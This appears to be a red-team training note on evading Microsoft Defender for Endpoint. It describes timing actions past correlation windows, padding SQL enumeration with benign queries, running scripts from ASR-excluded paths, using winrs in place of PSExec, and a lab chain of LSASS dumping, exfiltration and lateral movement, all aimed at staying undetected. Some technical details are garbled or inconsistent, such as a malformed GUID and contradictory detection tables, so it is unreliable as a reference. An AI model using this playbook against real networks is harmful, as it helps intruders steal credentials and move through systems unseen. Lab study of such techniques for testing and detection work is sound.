# EDR Evasion — Correlation Bypass & Attack Surface Reduction (ASR) Rule Evasion

**Date:** 18 August 2026

---

## EDR Correlation-Based Detection

**How EDRs correlate activity:**

```
Timeline of Suspicious Actions:
├─ T+0:00   → Suspicious Action 1 (Credential dump)
├─ T+0:15   → Suspicious Action 2 (Process injection)
├─ T+0:30   → Suspicious Action 3 (Network connection)
└─ T+0:45   → Suspicious Action 4 (Lateral movement)

Within time window (e.g., 10 minutes):
  If multiple suspicious = ATTACK DETECTED
  Correlation threshold exceeded
  ALERT FIRED
```

---

## Correlation Detection Reset

**Each EDR has different correlation windows:**

| EDR | Correlation Window | Detection Sensitivity |
|---|---|---|
| MDE | ~10 minutes | Very High |
| CrowdStrike | ~15 minutes | High |
| Endpoint | Varies | Medium-High |
| Sophos | ~5-10 minutes | High |

**After window expires:** Counters reset, correlation chains broken

---

## Strategy 1: Timing-Based Bypass

**Wait for correlation window to reset before next action:**

```powershell
# Action 1: Suspicious activity
# [ACTION 1 - LOGGED]

# WAIT: ~10-15 minutes (exceeds correlation window)
# [CORRELATION WINDOW RESETS]

# Action 2: Next suspicious activity
# [ACTION 2 - LOGGED BUT NOT CORRELATED]
# No chain detected = No alert

Start-Sleep -Seconds 600  # 10 minutes
```

---

**Example workflow with timing:**

```
T+00:00 → Mimikatz execution (credential dump)
          [CORRELATION COUNTER: 1]
          
T+10:30 → Wait for window reset
          [CORRELATION COUNTER: RESET]
          
T+10:35 → Process injection
          [CORRELATION COUNTER: 1 (new window)]
          
T+21:00 → Wait for second window reset
          [CORRELATION COUNTER: RESET]
          
T+21:05 → Lateral movement
          [CORRELATION COUNTER: 1 (new window)]
          
Result: No correlation chain = No alert
```

---

## Strategy 2: Breaking Detection Chains

**Insert non-suspicious queries between suspicious actions.**

**Purpose:** Break the attack pattern recognition

**Example - SQL Server queries:**

```sql
-- Suspicious Query (Enumeration)
SELECT name FROM sys.databases;

-- Non-suspicious queries (break chain)
SELECT @@version;
SELECT GETDATE();
SELECT USER_NAME();

-- Another suspicious query
SELECT * FROM sys.server_principals;

-- More non-suspicious queries
DBCC DROPCLEANBUFFERS;
DBCC FREEPROCCACHE;

-- Continue with suspicious activity
SELECT * FROM sys.sql_logins;
```

**Why it works:**
- EDR sees mixed pattern (not pure attack)
- Normal/suspicious ratio lower
- Correlation chain broken
- Looks like legitimate admin work
- Detection threshold not exceeded

---

## Query Pattern Obfuscation

**Make queries less obviously malicious:**

```sql
-- Obviously malicious (DETECTED)
SELECT * FROM sys.sql_logins WHERE password_hash IS NOT NULL;

-- Obfuscated version (NOT DETECTED)
SELECT name, sid FROM sys.sql_logins;
-- Followed by normal queries
SELECT * FROM sys.tables;
-- Then extract data later via different method
```

---

## Attack Surface Reduction (ASR) Rules

**ASR = Set of rules that block specific attack techniques.**

**Rule management:**
- Rules defined by GUIDs (unique identifiers)
- Written in .lua format
- Can be extracted from target machines
- Customizable per organization
- Different enforcement levels (block, warn, audit)

---

## ASR Rule Categories

| Category | Purpose | Examples |
|---|---|---|
| **Execution** | Block suspicious execution | PSExec, WMI, PsRemoting |
| **Exploitation** | Block exploit techniques | Office macros, ROP chains |
| **Credential access** | Block credential theft | LSASS dumping, Kerberoasting |
| **Lateral movement** | Block lateral movement | Process creation, networking |
| **Data exfiltration** | Block data stealing | Unusual file operations |

---

## Common ASR Rules in MDE

**Rule: Block process creations originating from PSExec and WMI commands**

```
GUID: d4f940ab-401b-4efc-aadc-ad5f3c50f649
Target: Processes created by PSExec or WMI
Action: Block execution
Detection: Monitor for PSExec.exe or WmiPrvSE.exe child processes
```

**Rule: Block Office macro execution**

```
GUID: d3e037e1-3eb88-44c8-a917-57927947596d
Target: Office macros
Action: Block execution
Detection: Monitor for Office macro execution
```

---

## GetMonitoredLocations Function

**Displays processes monitored by MDE:**

```powershell
# PowerShell to extract monitored processes
# (Requires admin access to target)

# Example monitored processes:
# - PSExec.exe
# - WmiPrvSE.exe (WMI)
# - powershell.exe (PSRemoting)
# - cmd.exe (various contexts)
# - cscript.exe (scripts)
# - wscript.exe (scripts)
# - regsvcs.exe
# - InstallUtil.exe
```

---

**Why monitoring matters:**

```
Remote execution via monitored process:
PSExec.exe → Creates child process
            ↓
MDE detects PSExec parent
            ↓
All child processes flagged
            ↓
ALERT FIRED
```

---

## Solution 1: Use Unmonitored Alternatives

**Monitored tools:**
- PSExec.exe (PSExec execution)
- WMI (WmiPrvSE.exe)
- PsRemoting (Invoke-Command)
- PSSession

**Unmonitored alternatives:**
- winrs (Windows Remote Shell)
- SSH
- Custom tools
- Direct service execution

---

## Bypass: Using winrs Instead of PSExec

**Standard PSExec (DETECTED):**

```powershell
# Using PSExec (DETECTED by MDE)
PSExec.exe \\target.com -u domain\user -p pass cmd.exe

# What happens:
# 1. PSExec.exe launches (monitored process)
# 2. Remote service created (monitored)
# 3. Child process created (flagged)
# 4. ALERT: "PSExec execution detected"
```

---

**Using winrs (UNDETECTED):**

```powershell
# Using winrs (NOT detected by MDE, but detected by MDI)
winrs -r:target.com -u:domain\user -p:pass cmd.exe

# What happens:
# 1. winrs.exe launches (not in monitored list for ASR)
# 2. Remote Shell connection (expected behavior)
# 3. Command executed
# 4. NO ALERT from MDE
# (Note: MDI may still detect this - different system)
```

---

**Why winrs works:**

| Aspect | PSExec | winrs |
|---|---|---|
| **Monitored** | Yes (ASR rule) | No (default) |
| **Process** | suspicious.exe | system process |
| **Network** | Custom protocol | WinRM (expected) |
| **Detection** | High | Low (MDE) |
| **MDI Detection** | No | Yes |

---

## Solution 2: Command Line Exclusions

**GetCommandLineExclusions function** displays exclusion patterns:

```powershell
# Common exclusions (example):
# ".:\\windows\\ccm\\systemtemp\\."
# ".:\\programfiles\\.*\\exe"
# "windowsupdate"
# "defender"
```

---

**How exclusions work:**

```
ASR Rule checks:
1. Is this process monitored?
2. Check command line against exclusion patterns
3. If matches exclusion pattern → ALLOW
4. If no match → BLOCK

Example:
Process: powershell.exe
Command: powershell.exe -NoProfile -File C:\windows\ccm\systemtemp\script.ps1

Check exclusion: ".:\\windows\\ccm\\systemtemp\\."
Command matches? YES
Result: ALLOWED (excluded from rule)
```

---

## Bypass Using Command Line Exclusions

**Modify command to match exclusion pattern:**

```powershell
# Normal command (DETECTED)
powershell.exe -NoProfile -Command "Get-Process"

# Exclude from ASR by using excluded path
# If ".:\\windows\\ccm\\systemtemp\\." is excluded:

powershell.exe -NoProfile -File "C:\windows\ccm\systemtemp\script.ps1"

# Command now matches exclusion pattern
# ASR rule bypassed
# Execution allowed
```

---

**Real-world exclusion bypass:**

```powershell
# Create script in excluded directory
$script = @"
Add-Type -AssemblyName System.Net.Http
# Malicious code here
"@

# Save to excluded path
$script | Out-File "C:\windows\ccm\systemtemp\hidden.ps1"

# Execute from excluded path (bypasses ASR)
powershell.exe -NoProfile -File "C:\windows\ccm\systemtemp\hidden.ps1"

# Result: Command matches exclusion → ASR bypassed
```

---

## Initial Enumeration OPSEC

**Problem: whoami.exe under sqlservr.exe detected**

```powershell
# Process context: sqlservr.exe (SQL Server)
whoami.exe
# What MDE sees:
# 1. Child process of sqlservr.exe
# 2. whoami.exe launched (not typical)
# 3. Unusual parent-child relationship
# 4. DETECTION: Anomalous process execution
```

---

**Why it's suspicious:**
- SQL Server shouldn't run whoami
- Not typical system behavior
- Behavioral anomaly detected
- Process tree looks malicious

---

## Solution: Use Environment Variables

**Alternative: SET USERNAME (undetected)**

```cmd
# Undetected enumeration
SET

# Output includes current user:
COMPUTERNAME=SQLSERVER
USERDOMAIN=DOMAIN
USERNAME=sqlservice
PROCESSOR_ARCHITECTURE=AMD64
```

---

**Why it's undetected:**
- SET is built-in cmd command (not external process)
- No child process creation
- No process tree anomalies
- Looks like normal environment query
- No behavioral red flags

---

## Other Process Enumeration Alternatives

| Standard Tool | Detection Risk | Alternative | OPSEC |
|---|---|---|---|
| whoami.exe | High | SET USERNAME | Excellent |
| tasklist.exe | High | Get-Process | Medium |
| net user | High | Get-ADUser | Medium |
| ipconfig.exe | Medium | gwmi Win32_NetworkAdapter | Good |
| systeminfo.exe | Medium | Get-ComputerInfo | Good |

---

## Complete Stealthy Enumeration Script

```powershell
# OPSEC-friendly enumeration
# No external process execution
# All built-in commands/APIs

# Current user (no whoami.exe)
echo %USERNAME%
echo %USERDOMAIN%

# Computer name
hostname

# Environment variables
SET

# Network info (via WMI, not ipconfig.exe)
Get-WmiObject Win32_NetworkAdapterConfiguration

# Process list (internal, not tasklist.exe)
Get-Process

# System info (internal, not systeminfo.exe)
Get-ComputerInfo
```

---

## Timeline-Based Bypass Workflow

```
Step 1: SQL Enumeration (T+0:00)
├─ Simple SQL queries
├─ Run non-suspicious queries
└─ [CORRELATION COUNTER: 1]

Step 2: Wait for Reset (T+10:30)
└─ [CORRELATION WINDOW RESETS]

Step 3: Credential Extraction (T+10:35)
├─ MiniDumpDotnet LSASS dump
├─ Exfiltrate reversed dump
└─ [CORRELATION COUNTER: 1 (new window)]

Step 4: Wait for Reset (T+21:00)
└─ [CORRELATION WINDOW RESETS]

Step 5: Lateral Movement (T+21:05)
├─ Use winrs (not PSExec)
├─ Execute from excluded path
└─ [CORRELATION COUNTER: 1 (new window)]

Step 6: Enumeration (T+21:10)
├─ Use SET (not whoami.exe)
├─ Use Get-Process (not tasklist.exe)
└─ [CORRELATION COUNTER: 2]

Result: No correlation chain triggered
        No alert fired
        Undetected progression through attack
```

---

## ASR Rule Extraction (Advanced)

**Extract ASR rules from target machine (requires admin):**

```powershell
# Registry location for ASR rules
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR"

# Extract all rules
Get-MpPreference | Select-Object AttackSurfaceReductionRules_Ids
Get-MpPreference | Select-Object AttackSurfaceReductionRules_Actions

# Output shows:
# Rule GUID : Action (Block/Warn/Audit/Disabled)
```

---

**Use extracted rules to customize bypass:**

```
After extraction, know exactly:
1. Which rules are enabled
2. Which rules are in block mode
3. Which rules have exclusions
4. Which rules can be bypassed

Customize attack accordingly
```

---

## Detection Avoidance Summary

| Technique | Purpose | Implementation |
|---|---|---|
| **Timing** | Break correlation chains | Wait ~10 mins between actions |
| **Obfuscation** | Hide attack pattern | Mix suspicious + normal queries |
| **Alternative tools** | Avoid monitored processes | winrs instead of PSExec |
| **Exclusions** | Bypass ASR rules | Execute from excluded paths |
| **Alternatives** | Replace flagged commands | SET instead of whoami.exe |
| **Extraction** | Know exact rules | Extract ASR rules from target |

---

## Complete EDR Evasion Checklist

```
☐ Understand correlation windows for target EDR (~10 mins)
☐ Timestamp actions with sufficient gaps
☐ Insert non-suspicious activity between actions
☐ Extract ASR rules from target
☐ Identify monitored processes
☐ Replace with unmonitored alternatives
☐ Execute from excluded command-line paths
☐ Use built-in tools/environment variables
☐ Avoid external process creation
☐ Monitor MDE dashboard for detections
☐ Adjust tactics if patterns detected
```

---

## Command Reference

| Task | Command | OPSEC |
|---|---|---|
| Enumerate user (safe) | `SET USERNAME` | Excellent |
| Remote access (safe) | `winrs -r:target cmd` | Good |
| Remote access (detected) | `PSExec \\target cmd` | Poor |
| Extract ASR rules | `Get-MpPreference` | Good |
| Excluded execution | `powershell -File C:\windows\ccm\systemtemp\s.ps1` | Excellent |
| Break detection chain | Mix benign + malicious queries | Excellent |
| Bypass correlation | Wait 10+ minutes | Excellent |

---

## Lab Implementation on eu-sql

**Steps to remain undetected:**

1. Initial access via SQL Server
2. Simple SQL enumeration queries
3. Mix queries with non-suspicious ones
4. Wait for correlation window reset
5. Credential extraction via MiniDumpDotnet
6. Wait for correlation window reset
7. Lateral movement via winrs
8. Enumeration via SET/Get-Process
9. Data exfiltration via SMB
10. Monitor MDE dashboard for alerts

---

## Key Takeaway

```
EDR EVASION MASTERCLASS:
1. Understand EDR correlation windows (~10 minutes)
2. Separate suspicious actions across windows
3. Mix suspicious + non-suspicious activity
4. Extract ASR rules to know monitored processes
5. Use unmonitored alternative tools
6. Execute from excluded command-line paths
7. Replace flagged commands with built-ins
8. Avoid external process creation
9. Timeline your actions strategically
10. Remain undetected throughout attack chain
```

---

## References

- [Attack Surface Reduction Rules (Microsoft)](https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-atp/attack-surface-reduction)
- [MDE Detection Rules](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-guard/wd-app-guard-overview)
- [Windows Remote Shell (winrs)](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/winrs)
- [EDR Evasion (SpecterOps)](https://posts.specterops.io/)

---

*Next: Advanced Persistence & Cleanup Techniques*
